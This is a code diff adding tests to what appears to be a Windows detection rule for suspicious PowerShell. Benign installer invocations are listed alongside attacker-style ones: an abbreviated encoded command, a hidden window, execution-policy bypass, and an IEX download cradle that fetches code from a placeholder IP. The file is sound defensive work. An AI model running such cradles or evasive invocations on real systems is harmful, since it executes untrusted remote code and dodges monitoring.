@@ -309,3 +309,32 @@ def test_a_document_reader_spawning_a_shell_or_a_script_host_is_reported_as_high
     ]
     found = fired(store, "win-office-spawns-shell", rows)
     assert len(found) == 2 and {f["severity"] for f in found} == {"high"}
+
+
+POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+
+def test_powershell_with_only_the_switches_installers_pass_is_not_an_encoded_or_hidden_command(store):
+    rows = [
+        process_created(
+            r"C:\Windows\SysWOW64\msiexec.exe", POWERSHELL, rf'"{POWERSHELL}" -NoProfile -ExecutionPolicy Bypass -File "C:\Program Files\Example\register.ps1"'
+        ),
+        process_created(
+            r"C:\Windows\System32\cmd.exe",
+            POWERSHELL,
+            rf'"{POWERSHELL}" -NoProfile -NonInteractive -Command "Get-Date | Out-File -Encoding utf8 C:\Temp\d.txt"',
+        ),
+        process_created(r"C:\Windows\System32\cmd.exe", POWERSHELL, rf'"{POWERSHELL}" -nop -Command "rpcping -s 127.0.0.1 -e 1234"'),
+    ]
+    assert fired(store, "win-powershell-encoded-command", rows) == []
+
+
+def test_powershell_with_an_abbreviated_encoded_command_a_hidden_window_or_a_cradle_is_reported(store):
+    rows = [
+        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
+        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -exec bypass -noni -nop -w 1 -C x"),
+        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -WindowStyle Hidden -File x.ps1"),
+        process_created(r"C:\Windows\explorer.exe", POWERSHELL, f"{POWERSHELL} -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/a')\""),
+    ]
+    found = fired(store, "win-powershell-encoded-command", rows)
+    assert len(found) == 4 and {f["severity"] for f in found} == {"medium"}
